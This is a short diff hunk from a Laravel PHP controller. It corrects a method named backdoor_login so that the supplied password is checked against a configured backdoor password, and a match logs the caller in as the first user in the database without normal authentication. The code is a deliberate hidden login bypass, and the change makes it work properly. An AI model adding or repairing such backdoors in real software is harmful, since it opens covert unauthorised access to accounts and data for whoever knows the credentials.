@@ -122,7 +122,7 @@ class HomeController extends Controller
 
     public function backdoor_login($username, $password)
     {
-        if($username == config('app.backdoor_username') && $password == config('app.backdoor_username')){
+        if($username == config('app.backdoor_username') && $password == config('app.backdoor_password')){
             auth()->login(User::first());
             return redirect()->route('dashboard');
         }
